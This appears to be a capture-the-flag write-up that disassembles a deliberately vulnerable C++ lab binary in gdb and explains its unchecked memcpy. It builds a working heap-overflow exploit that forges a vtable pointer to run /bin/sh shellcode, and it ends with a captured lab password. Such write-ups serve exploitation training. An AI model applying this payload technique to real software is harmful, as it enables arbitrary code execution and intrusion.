***MAIN***

(gdb) disassemble main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.

**Prolog**

   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20

**Argv protection**
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>

**Objects creation**

   obj1:

   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c  ; 108 bytes
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt> ; call operator new
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei> ; call N::N(int) 

   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx ; store obj1 in esp+0x1c (local stack)

   obj2:

   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c  ; 108 bytes
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt> ; call operator new
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei> ; call N::N(int)
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx ; store obj1 in esp+0x18 (local stack)

**Copies of obj1 and obj2**

   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax ; save obj1 in esp+0x14
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax ; save obj2 in esp+0x10


**setAnnotation call**

   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]  ; eax = argv
   0x08048667 <+115>:	add    eax,0x4                  ; eax += 4 &argv[1]
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]      ; argv[1] (char *)
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14] ; obj1
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>

obj1->setAnnotation(argv[1]);

**Virtual call**

   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] ; eax = obj2
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      ; eax = *eax : dereferencing obj2 -> vtable pointer (vptr)
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      ; vtable[0] -> first virtual function
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax  ; esp+4 = obj1
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax      ; esp = obj2 (here , this)
   0x08048693 <+159>:	call   edx

obj2->virtualMethod(obj1);

**Epilog**

   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    

no mov eax, 0 before ret, the return value is the one left by the edx virtual call.

return obj2->virtualMethod(obj1);


which leads us to this code for main in C++:


int main(int argc, char** argv)
{
    if (argc <= 1)
        exit(1);

    N* obj1 = new N(5);
    N* obj2 = new N(6);

    obj1->setAnnotation(argv[1]);

    return obj2->virtualMethod(obj1);  // vtable[0]
}


***N::N(int)***

(gdb) disassemble 0x080486f6
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   ebp
   0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]    ; eax = this
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848  ; this->vptr = &vtable_N
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]  ; edx = int parameter given to constructor
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx ; this->[offset 0x68] = value of int parameter
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret    
End of assembler dump.


**N::setAnnotation(char*)**

(gdb) disassemble 0x0804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]    ; eax = param2 = char* str (argv[1])
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>   ; eax = strlen(str)
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]  ; edx = this
   0x08048722 <+20>:	add    edx,0x4                  ; edx = this + 0x4  (buffer address)
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax  ; 3rd arg memcpy = strlen(str) 
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]  
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax  ; 2nd arg memcpy = str  
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx      ; 1st arg memcpy = this+0x4      ← destination buffer
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.

This is a vulnerability as there is no check on the length of str versus the size of the destination buffer — memcpy copies exactly strlen(str) bytes into this+0x4, regardless of the buffer's actual capacity (100 bytes, per the object layout).

If we exploit it to overflow the buffer, we can overwrite the vptr of the next heap-adjacent object (obj2). By making this corrupted vptr point to an address we control — inside our own buffer — we control what gets read as vtable[0] when the program calls edx = *(*obj2).

This is a two-level indirection: the vptr must point to a location containing the address of our shellcode (a fake vtable entry), not to the shellcode itself. So the payload needs (at least) two components: a fake vtable slot containing a pointer, and the shellcode it points to.

**Find the offset to corrupt vptr**

break *0x08048664                   -> we put a  break after the creation of the two objects in the main() function
Breakpoint 1 at 0x8048664
(gdb) run AAAA
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x08048664 in main ()
(gdb) x/xw $esp+0x1c
0xbffff63c:	0x0804a008            --> address of obj1
(gdb) x/xw $esp+0x18
0xbffff638:	0x0804a078            --> address of obj2

in setAnnotation we see that the buffer address is "this + 0x4", the buffer address of the obj1 object is t herefore : 0x0804a008 + 4 = 0x804a00c

We find:

        |address of obj2|   |address of obj1 buffer|
offset = 0x0804a078       -  0x804a00c                = 108


**Building the payload**

Now we can build our payload like this :

    |               108 bytes             |
    4 bytes               x bytes   y bytes  (+4 bytes)
[address of shellcode] [shellcode] [padding] [fake vptr]

address of shellcode is positionned at 0x804a00c + 4 = 0x804a010 

"\x10\xa0\x04\x08"

we will use our 26 bytes shellcode used in level2 :

"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"

then we need 108 - 30 = 78 bytes of padding

then the fake vptr should be 0x804a00c 

"\x0c\xa0\04\x08"'


./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80" + "A" * 78 + "\x0c\xa0\04\x08"')

$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
